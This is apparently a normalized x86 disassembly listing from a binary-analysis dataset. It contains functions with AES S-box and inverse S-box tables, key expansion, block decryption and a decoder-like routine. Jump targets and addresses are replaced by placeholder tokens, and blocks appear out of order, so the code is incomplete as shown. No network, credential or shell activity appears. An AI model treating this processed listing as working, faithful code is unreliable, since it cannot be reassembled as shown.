sub_401000
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi + 0x30 ] eax
mov eax [ ebp + 0x14 ]
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x18 ]
push eax
push edi
push sub_401123
push ecx
call sub_410d98
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ edi + 0x20 ]
mov ecx [ edi + 0x4 ]
movzx eax [ ecx ]
push eax
push ecx
push 0x2
push edi
call sub_40105d
add esp 0x10
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
movzx esi si
or esi 0x80070000
jmp r-xdata
sub_40105d
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push [ eax + 0x18 ]
call sub_410dd8
add esp 0x14
test eax eax
jle r-xdata
pop ebp
retn
movzx eax ax
or eax 0x80070000
sub_401088
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_410e1b
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
pop ecx
pop esi
pop ebp
retn
sub_4010a7
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
push esi
mov esi r--data
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx + 0x1 ]
and [ ecx + 0x4 ] 0x0
and [ ecx + 0xc ] 0x0
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x1 ]
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx ecx
sub_4010df
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov esi r--data
mov edx edi
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx * 2 + 0x2 ]
mov [ ecx + 0x4 ] edi
mov [ ecx + 0xc ] edi
pop edi
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x2 ]
mov ax [ edx ]
add edx 0x2
cmp ax di
jne r-xdata
sub edx ecx
sar edx 0x1
sub_401123
push ebp
mov ebp esp
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
pop ebp
retn 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x20 ]
sub ecx 0x0
je r-xdata
and [ eax ] 0x0
sub ecx 0x1
jne r-xdata
pop esi
pop edi
pop ebx
push [ eax + 0x34 ]
push [ ebp + 0x24 ]
push edi
push ebx
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
mov ecx [ ebp + 0x18 ]
test dl dl
je r-xdata
mov ecx 0x100
movzx ecx dl
inc ecx
jmp r-xdata
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] edi
jmp r-xdata
sub_40119b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
je r-xdata
mov al 0x1
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
mov eax [ edx + 0xc ]
and ecx [ ebp + 0xc ]
and eax [ ebp + 0x10 ]
or ecx eax
je r-xdata
xor al al
pop ebp
retn
mov eax [ edx + 0x10 ]
mov ecx [ edx + 0x14 ]
and eax [ ebp + 0xc ]
and ecx [ ebp + 0x10 ]
cmp eax [ edx + 0x10 ]
jne r-xdata
cmp ecx [ edx + 0x14 ]
je r-xdata
sub_4011d7
push ebp
mov ebp esp
sub esp 0x10
mov al [ r--data ]
mov edx [ ebp + 0xc ]
mov ecx edx
push esi
mov esi [ ebp + 0x8 ]
sub ecx r--data
or ecx 0xb000000
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x8 ]
add edx 0xc
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x4 ]
push ecx
and [ ecx + 0x4 ] 0x0
push [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax [ esi + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
movzx eax [ eax ]
and [ ecx + 0x14 ] 0x0
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] 0x2
mov [ ecx + 0x10 ] edx
movzx eax [ edx ]
mov [ ecx + 0x18 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ecx + 0x1c ] 0x1
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_410e55
add esp 0x1c
pop esi
mov esp ebp
pop ebp
retn
sub_401310
push ebp
mov ebp esp
sub esp 0x200
push esi
push edi
mov [ rw-data ] r--data
mov [ ebp - 0x100 ] 0x7b777c63
mov [ ebp - 0xfc ] 0xc56f6bf2
mov [ ebp - 0xf8 ] 0x2b670130
mov [ ebp - 0xf4 ] 0x76abd7fe
mov [ ebp - 0xf0 ] 0x7dc982ca
mov [ ebp - 0xec ] 0xf04759fa
mov [ ebp - 0xe8 ] 0xafa2d4ad
mov [ ebp - 0xe4 ] 0xc072a49c
mov [ ebp - 0xe0 ] 0x2693fdb7
mov [ ebp - 0xdc ] 0xccf73f36
mov [ ebp - 0xd8 ] 0xf1e5a534
mov [ ebp - 0xd4 ] 0x1531d871
mov [ ebp - 0xd0 ] 0xc323c704
mov [ ebp - 0xcc ] 0x9a059618
mov [ ebp - 0xc8 ] 0xe2801207
mov [ ebp - 0xc4 ] 0x75b227eb
mov [ ebp - 0xc0 ] 0x1a2c8309
mov [ ebp - 0xbc ] 0xa05a6e1b
mov [ ebp - 0xb8 ] 0xb3d63b52
mov [ ebp - 0xb4 ] 0x842fe329
mov [ ebp - 0xb0 ] 0xed00d153
mov [ ebp - 0xac ] 0x5bb1fc20
mov [ ebp - 0xa8 ] 0x39becb6a
mov [ ebp - 0xa4 ] 0xcf584c4a
mov [ ebp - 0xa0 ] 0xfbaaefd0
mov [ ebp - 0x9c ] 0x85334d43
mov [ ebp - 0x98 ] 0x7f02f945
mov [ ebp - 0x94 ] 0xa89f3c50
mov [ ebp - 0x90 ] 0x8f40a351
mov [ ebp - 0x8c ] 0xf5389d92
mov [ ebp - 0x88 ] 0x21dab6bc
mov [ ebp - 0x84 ] 0xd2f3ff10
mov [ ebp - 0x80 ] 0xec130ccd
mov [ ebp - 0x7c ] 0x1744975f
mov [ ebp - 0x78 ] 0x3d7ea7c4
mov [ ebp - 0x74 ] 0x73195d64
mov [ ebp - 0x70 ] 0xdc4f8160
mov [ ebp - 0x6c ] 0x88902a22
mov [ ebp - 0x68 ] 0x14b8ee46
mov [ ebp - 0x64 ] 0xdb0b5ede
mov [ ebp - 0x60 ] 0xa3a32e0
mov [ ebp - 0x5c ] 0x5c240649
mov [ ebp - 0x58 ] 0x62acd3c2
mov [ ebp - 0x54 ] 0x79e49591
mov [ ebp - 0x50 ] 0x6d37c8e7
mov [ ebp - 0x4c ] 0xa94ed58d
mov [ ebp - 0x48 ] 0xeaf4566c
mov [ ebp - 0x44 ] 0x8ae7a65
mov [ ebp - 0x40 ] 0x2e2578ba
mov [ ebp - 0x3c ] 0xc6b4a61c
mov [ ebp - 0x38 ] 0x1f74dde8
mov [ ebp - 0x34 ] 0x8a8bbd4b
mov [ ebp - 0x30 ] 0x66b53e70
mov [ ebp - 0x2c ] 0xef60348
mov [ ebp - 0x28 ] 0xb9573561
mov [ ebp - 0x24 ] 0x9e1dc186
mov [ ebp - 0x20 ] 0x1198f8e1
mov [ ebp - 0x1c ] 0x948ed969
mov [ ebp - 0x18 ] 0xe9871e9b
mov [ ebp - 0x14 ] 0xdf2855ce
mov [ ebp - 0x10 ] 0xd89a18c
mov [ ebp - 0xc ] 0x6842e6bf
mov [ ebp - 0x8 ] 0xf2d9941
mov [ ebp - 0x4 ] 0x16bb54b0
mov [ ebp - 0x200 ] 0xd56a0952
mov [ ebp - 0x1fc ] 0x38a53630
mov [ ebp - 0x1f8 ] 0x9ea340bf
mov [ ebp - 0x1f4 ] 0xfbd7f381
mov [ ebp - 0x1f0 ] 0x8239e37c
mov [ ebp - 0x1ec ] 0x87ff2f9b
mov [ ebp - 0x1e8 ] 0x44438e34
mov [ ebp - 0x1e4 ] 0xcbe9dec4
mov [ ebp - 0x1e0 ] 0x32947b54
mov [ ebp - 0x1dc ] 0x3d23c2a6
mov [ ebp - 0x1d8 ] 0xb954cee
mov [ ebp - 0x1d4 ] 0x4ec3fa42
mov [ ebp - 0x1d0 ] 0x66a12e08
mov [ ebp - 0x1cc ] 0xb224d928
mov ecx 0x40
mov [ ebp - 0x1c8 ] 0x49a25b76
lea esi [ ebp - 0x100 ]
mov [ ebp - 0x1c4 ] 0x25d18b6d
mov edi rw-data
mov [ ebp - 0x1c0 ] 0x64f6f872
[ edi ] [ esi ]
mov ecx 0x40
mov [ ebp - 0x1bc ] 0x16986886
lea esi [ ebp - 0x200 ]
mov [ ebp - 0x1b8 ] 0xcc5ca4d4
mov edi rw-data
mov [ ebp - 0x1b4 ] 0x92b6655d
mov [ ebp - 0x1b0 ] 0x5048706c
mov [ ebp - 0x1ac ] 0xdab9edfd
mov [ ebp - 0x1a8 ] 0x5746155e
mov [ ebp - 0x1a4 ] 0x849d8da7
mov [ ebp - 0x1a0 ] 0xabd890
mov [ ebp - 0x19c ] 0xad3bc8c
mov [ ebp - 0x198 ] 0x558e4f7
mov [ ebp - 0x194 ] 0x645b3b8
mov [ ebp - 0x190 ] 0x8f1e2cd0
mov [ ebp - 0x18c ] 0x20f3fca
mov [ ebp - 0x188 ] 0x3bdafc1
mov [ ebp - 0x184 ] 0x6b8a1301
mov [ ebp - 0x180 ] 0x4111913a
mov [ ebp - 0x17c ] 0xeadc674f
mov [ ebp - 0x178 ] 0xcecff297
mov [ ebp - 0x174 ] 0x73e6b4f0
mov [ ebp - 0x170 ] 0x2274ac96
mov [ ebp - 0x16c ] 0x8535ade7
mov [ ebp - 0x168 ] 0xe837f9e2
mov [ ebp - 0x164 ] 0x6edf751c
mov [ ebp - 0x160 ] 0x711af147
mov [ ebp - 0x15c ] 0x89c5291d
mov [ ebp - 0x158 ] 0xe62b76f
mov [ ebp - 0x154 ] 0x1bbe18aa
mov [ ebp - 0x150 ] 0x4b3e56fc
mov [ ebp - 0x14c ] 0x2079d2c6
mov [ ebp - 0x148 ] 0xfec0db9a
mov [ ebp - 0x144 ] 0xf45acd78
mov [ ebp - 0x140 ] 0x33a8dd1f
mov [ ebp - 0x13c ] 0x31c70788
mov [ ebp - 0x138 ] 0x591012b1
mov [ ebp - 0x134 ] 0x5fec8027
mov [ ebp - 0x130 ] 0xa97f5160
mov [ ebp - 0x12c ] 0xd4ab519
mov [ ebp - 0x128 ] 0x9f7ae52d
mov [ ebp - 0x124 ] 0xef9cc993
mov [ ebp - 0x120 ] 0x4d3be0a0
mov [ ebp - 0x11c ] 0xb0f52aae
mov [ ebp - 0x118 ] 0x3cbbebc8
mov [ ebp - 0x114 ] 0x61995383
mov [ ebp - 0x110 ] 0x7e042b17
mov [ ebp - 0x10c ] 0x26d677ba
mov [ ebp - 0x108 ] 0x631469e1
mov [ ebp - 0x104 ] 0x7d0c2155
[ edi ] [ esi ]
push rw-data
push ecx
call sub_4019c0
pop edi
mov eax rw-data
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_401810
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x2b4
push esi
call sub_40d57b
add esp 0x8
sub_401840
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x13 ]
push esi
push edi
mov [ ebp - 0x18 ] eax
mov esi 0x4
lea edi [ eax + 0x4 ]
mov ecx edi
movzx eax [ ecx - 0x4 ]
lea ecx [ ecx + 0x1 ]
mov [ edx - 0x1 ] al
lea edx [ edx + 0x4 ]
movzx eax [ ecx - 0x1 ]
mov [ edx - 0x4 ] al
movzx eax [ ecx + 0x3 ]
mov [ edx - 0x3 ] al
movzx eax [ ecx + 0x7 ]
mov [ edx - 0x2 ] al
sub esi 0x1
jne r-xdata
xor ecx ecx
nop
movzx eax [ ecx + rw-data ]
xor [ ebp + ecx - 0x14 ] al
movzx eax [ ecx + rw-data ]
xor [ ebp + ecx - 0x10 ] al
movzx eax [ ecx + rw-data ]
xor [ ebp + ecx - 0xc ] al
movzx eax [ ecx + rw-data ]
xor [ ebp + ecx - 0x8 ] al
inc ecx
cmp ecx 0x4
jl r-xdata
push ebx
mov ebx 0x1
mov esi rw-data
nop [ eax ] eax
movzx eax [ ebp + ecx * 4 - 0x14 ]
movzx eax [ eax + rw-data ]
mov [ ebp + ecx * 4 - 0x14 ] al
movzx eax [ ebp + ecx * 4 - 0x13 ]
movzx eax [ eax + rw-data ]
mov [ ebp + ecx * 4 - 0x13 ] al
movzx eax [ ebp + ecx * 4 - 0x12 ]
movzx eax [ eax + rw-data ]
mov [ ebp + ecx * 4 - 0x12 ] al
movzx eax [ ebp + ecx * 4 - 0x11 ]
movzx eax [ eax + rw-data ]
mov [ ebp + ecx * 4 - 0x11 ] al
inc ecx
cmp ecx 0x4
jl r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_401b00
cmp ebx 0xa
je r-xdata
xor eax eax
nop
lea eax [ ebp - 0x14 ]
push eax
call sub_401b90
movzx ecx [ esi + eax - 0x4 ]
xor [ ebp + eax - 0x14 ] cl
movzx ecx [ esi + eax ]
xor [ ebp + eax - 0x10 ] cl
movzx ecx [ esi + eax + 0x4 ]
xor [ ebp + eax - 0xc ] cl
movzx ecx [ esi + eax + 0x8 ]
xor [ ebp + eax - 0x8 ] cl
inc eax
cmp eax 0x4
jl r-xdata
add esi 0x10
inc ebx
cmp esi rw-data
jle r-xdata
xor ecx ecx
nop [ eax ] eax
nop [ eax + eax ] ax
lea edx [ ebp - 0x13 ]
mov esi 0x4
pop ebx
movzx eax [ edx - 0x1 ]
lea edi [ edi + 0x1 ]
movzx ecx [ edx + 0x1 ]
lea edx [ edx + 0x4 ]
mov [ edi - 0x5 ] al
movzx eax [ edx - 0x4 ]
mov [ edi + 0x3 ] cl
movzx ecx [ edx - 0x2 ]
mov [ edi - 0x1 ] al
mov [ edi + 0x7 ] cl
sub esi 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
xor ecx ebp
pop edi
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_4019c0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] 0x8040201
mov [ ebp - 0xc ] 0x80402010
mov [ ebp - 0x8 ] 0x361b
lea edx [ esi + 0x2 ]
nop
movzx eax [ ecx + rw-data ]
mov [ edx - 0x2 ] al
movzx eax [ ecx + rw-data ]
mov [ edx - 0x1 ] al
movzx eax [ ecx + rw-data ]
mov [ edx ] al
movzx eax [ ecx + rw-data ]
inc ecx
mov [ edx + 0x1 ] al
add edx 0x4
cmp ecx 0x4
jl r-xdata
lea eax [ ebp - 0x10 ]
add esi 0x13
dec eax
mov edi 0x1
mov [ ebp - 0x18 ] eax
nop
mov bl [ esi - 0x10 ]
mov bl [ esi + eax - 0x4 ]
jmp r-xdata
mov cl [ esi - 0xc ]
mov cl [ esi + eax ]
jmp r-xdata
test eax eax
je r-xdata
mov bh [ esi - 0x8 ]
mov bh [ esi + eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0x11 ] cl
test eax eax
je r-xdata
mov dh [ esi - 0x4 ]
mov dh [ esi + eax + 0x8 ]
jmp r-xdata
test eax eax
je r-xdata
movzx ecx [ esi + eax - 0x13 ]
xor cl bl
mov [ esi + eax - 0x3 ] cl
movzx ecx [ esi + eax - 0xf ]
xor cl [ ebp - 0x11 ]
mov [ esi + eax + 0x1 ] cl
movzx ecx [ esi + eax - 0xb ]
xor cl bh
mov [ esi + eax + 0x5 ] cl
movzx ecx [ esi + eax - 0x7 ]
xor cl dh
mov [ esi + eax + 0x9 ] cl
inc eax
cmp eax 0x4
jl r-xdata
movzx ecx cl
mov dl bl
mov bl [ ecx + rw-data ]
movzx ecx bh
mov cl [ ecx + rw-data ]
mov [ ebp - 0x11 ] cl
movzx ecx dh
mov bh [ ecx + rw-data ]
movzx ecx dl
mov dh [ ecx + rw-data ]
mov ecx [ ebp - 0x18 ]
xor bl [ ecx + edi ]
test eax eax
jne r-xdata
test eax eax
je r-xdata
inc edi
add esi 0x10
cmp edi 0xa
jle r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn 0x8
sub_401b00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi 0x4
mov eax 0x3
add ecx esi
mov dh [ ecx + edi ]
lea ecx [ eax - 0x1 ]
and ecx 0x80000003
jns r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
add ecx esi
mov bl [ ecx + edi ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
add ecx esi
inc eax
mov dl [ ecx + edi ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
add ecx esi
mov cl [ ecx + edi ]
mov [ edi + esi + 0x3 ] cl
lea ecx [ eax - 0x2 ]
mov [ edi + esi ] dh
mov [ edi + esi + 0x1 ] bl
mov [ edi + esi + 0x2 ] dl
add esi 0x4
cmp ecx 0x4
jl r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
lea ecx [ eax - 0x2 ]
and ecx 0x80000003
jns r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_401b90
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x4 ]
push ebx
dec edx
mov [ ebp - 0x10 ] 0x4
add ecx 0x8
mov [ ebp - 0x14 ] edx
push esi
mov [ ebp - 0xc ] ecx
push edi
mov ecx edi
and ecx 0x80000003
jns r-xdata
xor al 0x1b
mov bl [ ebp + ecx - 0x4 ]
mov cl bl
add cl cl
test bl bl
jns r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
xor bl cl
lea ecx [ edi + 0x1 ]
and ecx 0x80000003
jns r-xdata
xor cl 0x1b
mov dl [ ebp + ecx - 0x4 ]
lea ecx [ edi + 0x2 ]
and ecx 0x80000003
jns r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov cl [ ebp + ecx - 0x4 ]
inc edi
xor cl dl
mov edx [ ebp + 0x8 ]
xor cl bl
xor cl al
mov [ edx ] cl
add edx 0x4
sub [ ebp - 0x8 ] 0x1
mov [ ebp + 0x8 ] edx
mov edx [ ebp - 0x14 ]
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov cl [ edx + edi ]
mov al cl
add al al
test cl cl
jns r-xdata
mov ecx [ ebp - 0xc ]
inc ecx
sub [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] ecx
jne r-xdata
lea eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] 0x4
mov [ ebp + 0x8 ] eax
mov edi 0x1
movzx eax [ eax ]
mov [ ebp - 0x4 ] al
movzx eax [ ecx - 0x4 ]
mov [ ebp - 0x3 ] al
movzx eax [ ecx ]
mov [ ebp - 0x2 ] al
movzx eax [ ecx + 0x4 ]
mov [ ebp - 0x1 ] al
nop [ eax ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_401c70
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ rw-data ]
push edi
test esi esi
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
mov ecx rw-data
push eax
call sub_4020b0
mov edi [ eax ]
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xc ]
mov ecx rw-data
push eax
call sub_4020b0
mov edi [ eax ]
test edi edi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx edx
mov eax [ edi + 0x8 ]
and edx 0x3
dec eax
shr ecx 0x2
and ecx eax
mov eax [ edi + 0x4 ]
sub esi 0x1
mov eax [ eax + ecx * 4 ]
mov eax [ eax + edx * 4 ]
mov [ rw-data ] esi
jne r-xdata
mov edi [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edx
mov eax [ edi + 0x8 ]
and edx 0x3
dec eax
shr ecx 0x2
and ecx eax
mov eax [ edi + 0x4 ]
sub esi 0x1
mov eax [ eax + ecx * 4 ]
mov eax [ eax + edx * 4 ]
mov [ rw-data ] esi
jne r-xdata
mov edi [ edi ]
inc [ rw-data ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop edi
mov [ rw-data ] 0x0
pop esi
mov esp ebp
pop ebp
retn
inc [ rw-data ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop edi
mov [ rw-data ] 0x0
pop esi
mov esp ebp
pop ebp
retn
sub_401d50
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ rw-data ]
push edi
test esi esi
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
mov ecx rw-data
push eax
call sub_4020b0
mov edi [ eax ]
test edi edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xc ]
mov ecx rw-data
push eax
call sub_4020b0
mov edi [ eax ]
test edi edi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx edx
mov eax [ edi + 0x8 ]
and edx 0x3
dec eax
shr ecx 0x2
and ecx eax
mov eax [ edi + 0x4 ]
sub esi 0x1
mov eax [ eax + ecx * 4 ]
mov eax [ eax + edx * 4 ]
mov [ rw-data ] esi
jne r-xdata
mov edi [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edx
mov eax [ edi + 0x8 ]
and edx 0x3
dec eax
shr ecx 0x2
and ecx eax
mov eax [ edi + 0x4 ]
sub esi 0x1
mov eax [ eax + ecx * 4 ]
mov eax [ eax + edx * 4 ]
mov [ rw-data ] esi
jne r-xdata
mov edi [ edi ]
inc [ rw-data ]
mov [ rw-data ] 0x0
jmp r-xdata
inc [ rw-data ]
mov [ rw-data ] 0x0
jmp r-xdata
test esi esi
jne r-xdata
push 0xf020
push eax
call sub_40d57b
mov esi [ rw-data ]
add esp 0x8
test eax eax
je r-xdata
test esi esi
jne r-xdata
push 0xf020
push eax
call sub_40d57b
mov esi [ rw-data ]
add esp 0x8
test eax eax
je r-xdata
sub_401e50
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
add eax ecx
test al 0x3
jne r-xdata
mov eax [ esi + 0x8 ]
push ebx
push edi
lea eax [ eax * 4 - 0x1 ]
and [ esi + 0xc ] eax
mov edi [ esi + 0x10 ]
add edi [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax edi
shr eax 0x2
dec ecx
and ecx eax
mov eax [ esi + 0x4 ]
lea ebx [ ecx * 4 ]
cmp [ ebx + eax ] 0x0
jne r-xdata
lea eax [ ecx + 0x4 ]
shr eax 0x2
cmp [ esi + 0x8 ] eax
ja r-xdata
mov eax [ esi + 0x4 ]
and edi 0x3
mov eax [ ebx + eax ]
lea ecx [ eax + edi * 4 ]
pop edi
pop ebx
test ecx ecx
je r-xdata
push 0x10
call sub_40d5ac
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_401f60
inc [ esi + 0x10 ]
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
call sub_413b11
mov eax [ esi + 0x4 ]
mov [ ebx + eax ] ecx
sub_401ef0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
cmp eax 0x3fffffff
ja r-xdata
call sub_413b11
shl eax 0x2
cmp eax 0x1000
jb r-xdata
push ecx
call j_sub_41a3a5
add esp 0x4
pop ebp
retn 0x8
test cl 0x1f
jne r-xdata
call sub_413b11
mov eax [ ecx - 0x4 ]
cmp eax ecx
jae r-xdata
call sub_413b11
sub ecx eax
cmp ecx 0x4
jb r-xdata
call sub_413b11
cmp ecx 0x23
ja r-xdata
call sub_413b11
mov ecx eax
sub_401f60
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi ecx
mov esi 0x1
mov [ ebp - 0x8 ] edi
mov ecx [ edi + 0x8 ]
test ecx ecx
cmovne esi ecx
nop [ eax + eax ] eax
mov eax 0xfffffff
sub eax esi
cmp eax esi
jb r-xdata
cmp esi 0x8
jae r-xdata
push r--data
call sub_40e50b
add esi esi
jmp r-xdata
mov ebx [ edi + 0xc ]
sub esi ecx
shr ebx 0x2
mov [ ebp - 0x4 ] ebx
lea eax [ ecx + esi ]
push eax
call sub_4020d0
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
shl ebx 0x2
shl edi 0x2
mov [ ebp - 0xc ] eax
lea edx [ ecx + ebx ]
add ebx eax
sub edi edx
add edi ecx
push edi
push edx
push ebx
call sub_410380
add esp 0xc
lea edx [ edi + ebx ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] esi
ja r-xdata
mov eax esi
sub eax ecx
cmp eax 0x1
jb r-xdata
mov edi [ ebp - 0x8 ]
lea ebx [ esi * 4 ]
push ebx
mov ecx [ edi + 0x4 ]
push ecx
push edx
call sub_410380
mov edi [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
lea eax [ ebx + edi ]
sub edi eax
lea ecx [ edx * 4 ]
add edi ecx
push edi
push eax
push [ ebp - 0xc ]
call sub_410380
mov eax [ ebp - 0xc ]
push ebx
add eax edi
push 0x0
push eax
call sub_411230
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
mov eax [ ebx + 0x4 ]
mov edi eax
mov ebx [ ebp - 0x4 ]
sub edi eax
lea ecx [ ebx * 4 ]
add edi ecx
push edi
push eax
push edx
call sub_410380
mov eax esi
sub eax ebx
shl eax 0x2
push eax
mov eax [ ebp - 0x10 ]
add eax edi
push 0x0
push eax
call sub_411230
mov edi [ ebp - 0xc ]
mov ecx ebx
lea eax [ ecx * 4 ]
push eax
push 0x0
push edi
call sub_411230
jmp r-xdata
mov [ ebx + 0x4 ] edi
add [ ebx + 0x8 ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ ebx + 0x8 ]
push eax
call sub_401ef0
mov ebx [ ebp - 0x8 ]
add esp 0x24
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
sub_4020d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0x3fffffff
ja r-xdata
pop ebp
retn 0x4
call sub_40e4ee
shl eax 0x2
cmp eax 0x1000
jb r-xdata
push eax
call sub_40d5ac
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ eax + 0x23 ]
cmp ecx eax
jbe r-xdata
jmp r-xdata
call sub_40e4ee
push ecx
call sub_40d5ac
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
call sub_413b11
call sub_413b11
lea eax [ ecx + 0x23 ]
and eax 0xffffffe0
mov [ eax - 0x4 ] ecx
pop ebp
retn 0x4
sub_402140
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ecx rw-data
mov [ ebp - 0xc ] edx
push esi
push edi
xor edi edi
lea esi [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
call sub_413b61
mov ecx eax
add esp 0x4
cmp [ rw-data ] 0x0
mov esi ecx
mov [ ebp - 0x8 ] ecx
mov ecx rw-data
mov [ ebp - 0x4 ] ecx
je r-xdata
mov eax [ ebp - 0x8 ]
sub esi eax
push esi
push eax
call sub_413b6c
mov ecx [ ebp - 0xc ]
add esp 0x8
pop edi
mov [ ecx ] eax
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov bl [ rw-data ]
mov eax rw-data
test bl bl
je r-xdata
mov dl [ ecx ]
mov cl bl
sub eax rw-data
js r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx rw-data
shl eax 0x6
mov dh [ edx + 0x1 ]
mov dl bl
cmp cl dl
je r-xdata
sub ecx rw-data
js r-xdata
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ eax + ecx ]
mov eax [ ebp - 0x4 ]
shl edx 0x6
